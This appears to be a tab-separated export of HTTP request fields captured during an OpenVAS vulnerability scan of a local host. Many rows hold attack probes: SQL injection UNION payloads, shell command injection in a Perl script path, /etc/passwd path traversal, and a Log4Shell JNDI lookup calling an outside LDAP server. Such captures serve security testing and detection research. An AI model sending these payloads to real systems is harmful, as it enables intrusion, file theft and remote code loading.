http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15786						1	http://192.168.1.104/web/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/elemata/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/elemata/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/ebbv/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/ebbv/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15797						1	http://192.168.1.104/ebbv2/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/ebbv2/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/sensorview.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/sensorview.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15803						1	http://192.168.1.104/elpro-demo/sensorview.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/elpro-demo/sensorview.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15804						1	http://192.168.1.104/webaccess/sensorview.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/webaccess/sensorview.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15805						1	http://192.168.1.104/cgi-bin/sensorview.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/sensorview.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15806						1	http://192.168.1.104/web/sensorview.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/sensorview.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/emo_virtual/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/emo_virtual/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15813						1	http://192.168.1.104/emorealty/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/emorealty/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/energine/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/energine/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15819						1	http://192.168.1.104/energine/htdocs/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/energine/htdocs/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/web/movielist.rss		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/movielist.rss
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/eocms/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/eocms/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/Subscribe/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/Subscribe/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15836						1	http://192.168.1.104/subscribe/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/subscribe/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15842						1	http://192.168.1.104/erp/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/erp/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15845						1	http://192.168.1.104/cgi-bin/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15846						1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/escortservice/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/escortservice/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15857						1	http://192.168.1.104/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15858						1	http://192.168.1.104/cgi-bin/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15859						1	http://192.168.1.104/web/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/show_profile.php?custid=1+and+1=0+union+select+1,0x53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/eshop.pl/seite=;cat%20eshop.pl|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/eshop.pl/seite=;cat%20eshop.pl|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15865						1	http://192.168.1.104/cgi-local/eshop.pl/seite=;cat%20eshop.pl|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-local/eshop.pl/seite=;cat%20eshop.pl|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		${jndi:ldap://192.168.133.137:11730/a}									no-cache						Close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15869						1	http://192.168.1.104/cgi-bin/eshop.pl/seite=;cat%20eshop.pl|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/eshop.pl/seite=;cat%20eshop.pl|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15873						1	http://192.168.1.104/web/eshop.pl/seite=;cat%20eshop.pl|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/eshop.pl/seite=;cat%20eshop.pl|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/EspoCRM/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/EspoCRM/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15880						1	http://192.168.1.104/CRM/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/CRM/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/released.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/released.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/etiko/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/etiko/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/etomite/index.php?id=plsqz_9keg'		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/etomite/index.php?id=plsqz_9keg'
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15897						1	http://192.168.1.104/cms/index.php?id=plsqz_9keg'		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cms/index.php?id=plsqz_9keg'
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15898						1	http://192.168.1.104/index.php?id=plsqz_9keg'		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/index.php?id=plsqz_9keg'
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15899						1	http://192.168.1.104/cgi-bin/index.php?id=plsqz_9keg'		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/index.php?id=plsqz_9keg'
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15900						1	http://192.168.1.104/web/index.php?id=plsqz_9keg'		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/index.php?id=plsqz_9keg'
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/evision/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/evision/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15906						1	http://192.168.1.104/evision/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/evision/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15907						1	http://192.168.1.104/cms/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cms/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15908						1	http://192.168.1.104/cms/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cms/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15910						1	http://192.168.1.104/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15911						1	http://192.168.1.104/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15912						1	http://192.168.1.104/cgi-bin/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15913						1	http://192.168.1.104/cgi-bin/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15914						1	http://192.168.1.104/web/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15915						1	http://192.168.1.104/web/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/modules/plain/adminpart/addplain.php?module=../../../javascript/sniffer.js%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/gallery/styles.php?toroot=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/gallery/styles.php?toroot=/etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15921						1	http://192.168.1.104/photos/styles.php?toroot=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/photos/styles.php?toroot=/etc/passwd%00
